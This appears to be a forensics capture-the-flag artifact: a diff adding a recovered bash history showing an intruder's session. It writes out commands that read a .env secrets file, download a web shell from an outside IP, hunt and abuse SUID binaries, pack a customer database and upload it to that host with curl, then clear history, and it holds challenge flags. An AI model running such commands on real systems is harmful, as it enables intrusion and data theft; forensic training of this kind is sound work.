@@ -1,0 +1,10 @@
+# .bash_history recuperado de memoria (el del disco fue borrado por el atacante)
+id
+cat /var/www/.env
+wget http://45.13.37.7/s.php -O /var/www/uploads/shell.php
+find / -perm -4000 -type f 2>/dev/null
+/usr/local/bin/system-check -p -c 'id'
+echo FLAG{dfir_privesc_suid}
+tar czf /tmp/.exfil/clientes.tar.gz /app/priv/clientes.db.txt
+curl -s -F "f=@/tmp/.exfil/clientes.tar.gz" http://45.13.37.7/upload?tag=FLAG{dfir_c2_exfil}
+history -c
